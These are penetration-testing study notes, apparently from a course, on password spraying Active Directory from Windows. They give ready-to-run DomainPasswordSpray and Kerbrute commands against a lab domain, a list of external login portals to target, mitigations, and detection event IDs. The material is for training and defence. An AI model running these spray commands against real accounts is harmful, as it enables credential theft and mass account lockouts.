# Section 12 — Internal Password Spraying from Windows

## DomainPasswordSpray.ps1

When authenticated to the domain on a Windows host, DomainPasswordSpray automatically:
- Generates a user list from AD
- Queries the domain password policy
- Removes disabled users
- Excludes accounts within 1 attempt of lockout

```powershell
# Import and run — no user list needed when domain-joined
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# If not domain-joined, supply a user list
Invoke-DomainPasswordSpray -UserList valid_users.txt -Password Welcome1 -OutFile spray_success
```

Tool location on lab host: `C:\Tools\`

Output goes to `spray_success` file — check it after the run.

---

## Kerbrute (Windows)

Same syntax as Linux — binary is in `C:\Tools\`:

```powershell
.\kerbrute.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

---

## External Spraying Targets (for report recommendations)

Common AD-authenticated external services to test during external phase:
- Microsoft O365 / Outlook Web Exchange (OWA)
- Exchange Web Access
- Skype for Business / Lync
- RDS portals
- Citrix portals
- VMware Horizon VDI
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet)
- Custom web apps using AD auth

---

## Mitigations (include in reports)

| Control | Detail |
|---------|--------|
| MFA | Best control — push notifications, OTP, RSA key. Enforce on ALL external portals |
| Restrict access | Least privilege — only grant app access to users who need it |
| Separate admin accounts | Privileged users get dedicated admin account, separate from daily-use account |
| Password hygiene | Passphrases, password filters blocking common words/seasons/company name |
| Network segmentation | Limits lateral movement if account is compromised |
| LAPS | Unique rotating local admin passwords — prevents local admin spray |

**Lockout policy caution:** Too restrictive a lockout policy creates a DoS risk — attacker can intentionally lock out all accounts.

---

## Detection (blue team awareness)

| Event ID | Meaning |
|----------|---------|
| 4625 | Account failed to log on — many in short period = spray indicator |
| 4771 | Kerberos pre-auth failed — LDAP spray indicator (requires Kerberos logging enabled) |

Alert rules: correlate many logon failures within a set time window → trigger alert.

---

## Exam Notes

- DomainPasswordSpray auto-builds user list and respects lockout policy — safest Windows spray tool
- `-ErrorAction SilentlyContinue` suppresses noise in output
- Always use `-OutFile` — don't rely on scrolling console output
- After spraying → test valid creds against SMB, WinRM, RDP immediately
- Event ID 4625 = SMB spray detection; 4771 = Kerberos/LDAP spray detection
